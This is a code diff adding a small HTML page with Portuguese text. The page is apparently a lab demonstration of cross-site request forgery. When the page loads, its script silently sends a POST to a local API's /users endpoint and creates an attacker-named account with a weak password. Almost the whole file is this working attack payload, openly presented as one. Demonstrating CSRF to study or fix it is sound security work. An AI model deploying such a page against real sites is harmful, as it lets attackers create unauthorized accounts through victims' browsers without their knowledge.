@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>😈 Ação em andamento...</h3>
+    <p>O ataque foi enviado silenciosamente em segundo plano.</p>
+    <div id="resposta"></div>
+
+    <script>
+      // Dados a serem enviados
+      const payload = {
+        username: "invasor_csrf",
+        email: "csrf@mal.com",
+        password: "123",
+      };
+
+      // Envia o POST sem sair da página
+      fetch("http://localhost:3000/users", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      })
+        .then((res) => res.json())
+        .then((data) => {
+          document.getElementById("resposta").innerText =
+            "Resposta da API: " + JSON.stringify(data);
+        })
+        .catch((err) => {
+          document.getElementById("resposta").innerText = "Erro: " + err;
+        });
+    </script>
+  </body>
+</html>
